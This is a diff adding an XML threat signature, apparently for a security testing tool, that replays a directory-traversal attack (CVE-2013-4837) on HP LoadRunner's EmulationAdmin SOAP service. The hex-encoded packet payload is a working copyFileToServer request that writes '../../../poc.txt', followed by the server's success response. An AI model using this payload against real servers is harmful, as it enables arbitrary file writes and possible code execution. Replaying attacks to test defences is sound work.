@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP LoadRunner Virtual User Generator EmulationAdmin Two Directory Traversal"/>
+    <EngDesc display="true" value="Two directory traversal vulnerabilities exist in HP LoadRunner Virtual User Generator. The vulnerabilities exist in the EmulationAdmin web service. The vulnerabilities are due to insufficient validation on the parameters of copyFileToServer and getFileContentAsLines methods. A remote unauthenticated attacker can exploit these vulnerabilities to create arbitrary files on the server or disclose sensitive information by reading arbitrary files on the server. Successful exploitation of one of these vulnerabilities could lead to arbitrary code execution on the target system."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="SOAP/HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Virtual_User_Generator"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Prior_to_11.52"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20131101-10"/>
+    <CVEID display="true" value="CVE-2013-4837"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="99231"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="4158b3e336717b3c7e5d2c73647d24b8"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635366948967071588"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1401183016" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:0E:6A" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02D8" Identification="5C78" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7A6B" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="52302" destPort="$HTTPdestPort" SeqNumber="FF3B1BD3" AckNumber="2D423AA1" HeaderLength="08" WindowSize="002E" Checksum="4876" UrgentPointer="0000" Options="0101080A76B847A600000000" Payload="504F5354202F53657276696365456D756C6174696F6E2F73657276696365732F456D756C6174696F6E41646D696E20485454502F312E310D0A436F6E74656E742D547970653A20746578742F786D6C3B20636861727365743D7574662D380D0A486F73743A203137322E31362E382E32363A383038300D0A534F4150416374696F6E3A200D0A436F6E74656E742D4C656E6774683A203531390D0A0D0A3C74656C757373656375726974796C6162733A456E76656C6F706520786D6C6E733A7672743D27687474703A2F2F736572766963652E656D756C6174696F6E2E77732E6D6572637572792E636F6D2720786D6C6E733A74656C757373656375726974796C6162733D27687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E76656C6F70652F2720786D6C6E733A7873693D27687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612D696E7374616E6365273E3C74656C757373656375726974796C6162733A426F64793E3C7672743A636F707946696C65546F5365727665722074656C757373656375726974796C6162733A656E636F64696E675374796C653D27687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E636F64696E672F273E3C49443E303C2F49443E3C46696C65506174683E2E2E2F2E2E2F2E2E2F706F632E7478743C2F46696C65506174683E3C46696C65436F6E74656E743E515546425155464251554642515546425155464251554642515546425155464251554642515546425155453D3C2F46696C65436F6E74656E743E3C2F7672743A636F707946696C65546F5365727665723E3C2F74656C757373656375726974796C6162733A426F64793E3C2F74656C757373656375726974796C6162733A456E76656C6F70653E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0E:6A" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="026A" Identification="25BA" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="7197" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="52302" SeqNumber="2D423AA1" AckNumber="FF3B1E77" HeaderLength="08" WindowSize="FD5B" Checksum="079A" UrgentPointer="0000" Options="0101080A02AF942976B847A6" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A436F6E74656E742D547970653A20746578742F786D6C3B636861727365743D7574662D380D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A446174653A205475652C203231204A616E20323031342031383A30363A333820474D540D0A0D0A3139610D0A3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D227574662D38223F3E3C736F6170656E763A456E76656C6F706520786D6C6E733A736F6170656E763D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E76656C6F70652F2220786D6C6E733A7873643D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612220786D6C6E733A7873693D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612D696E7374616E6365223E3C736F6170656E763A426F64793E3C6E73313A636F707946696C65546F536572766572526573706F6E736520736F6170656E763A656E636F64696E675374796C653D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E636F64696E672F2220786D6C6E733A6E73313D22687474703A2F2F736572766963652E656D756C6174696F6E2E77732E6D6572637572792E636F6D222F3E3C2F736F6170656E763A426F64793E3C2F736F6170656E763A456E76656C6F70653E0D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
